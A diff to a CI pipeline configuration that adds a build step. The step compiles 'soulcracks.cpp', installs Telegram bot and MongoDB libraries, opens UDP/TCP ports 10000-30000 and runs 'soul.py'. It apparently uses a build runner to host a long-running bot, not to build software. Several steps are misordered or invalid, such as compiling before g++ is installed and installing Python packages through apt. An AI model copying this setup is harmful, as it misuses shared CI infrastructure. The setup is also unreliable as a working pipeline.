@@ -5,3 +5,27 @@
     - "refs/heads/main"
   fail_on_prepare_env_warning: true
   resources: "X2LARGE"
+  actions:
+  - action: "python3 soul.py"
+    type: "BUILD"
+    docker_image_name: "library/python"
+    docker_image_tag: "3.13"
+    execute_commands:
+    - "g++ -std=c++14 soulcracks.cpp -o soul -pthread"
+    - "sudo apt update"
+    - "sudo apt install g++"
+    - "sudo apt install python-pip"
+    - "sudo apt install telebot pymongo aiohttp"
+    - "sudo apt install ufw"
+    - "sudo ufw enable"
+    - "sudo ufw allow ssh"
+    - "sudo ufw allow http"
+    - "sudo ufw allow https"
+    - "sudo ufw allow 10000:30000/udp"
+    - "sudo ufw allow 10000:30000/tcp"
+    - "sudo ufw status"
+    - "pip install telebot pymongo aiohttp"
+    - "python3 soul.py"
+    cached_dirs:
+    - "/root/.cache/pip"
+    shell: "BASH"
